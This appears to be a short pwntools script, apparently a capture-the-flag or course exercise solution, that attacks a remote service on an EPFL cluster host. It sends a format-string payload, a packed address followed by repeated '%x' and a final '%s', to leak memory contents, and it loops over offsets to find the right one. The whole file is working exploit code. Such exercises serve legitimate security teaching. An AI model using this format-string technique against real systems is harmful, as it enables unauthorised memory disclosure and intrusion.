
from pwn import *

host, port = 'hexhive005.iccluster.epfl.ch', 9003

for i in range(10):

    s = remote(host, port)

    s.recvuntil('Input your magical spell!')

    # payload = "\x11\x1b\xd4\x30"

    payload = p32(0x111bd430)

    print(f'Payload (just address): {payload}')

    for i in range(i):

        payload += b" %x "

    payload += b" %s"

    # log.info(payload)

    s.sendline(payload)

    try:

        print(s.recvline())

        print(s.recvline())

    except:

        print("An exception occurred!")

    s.close()
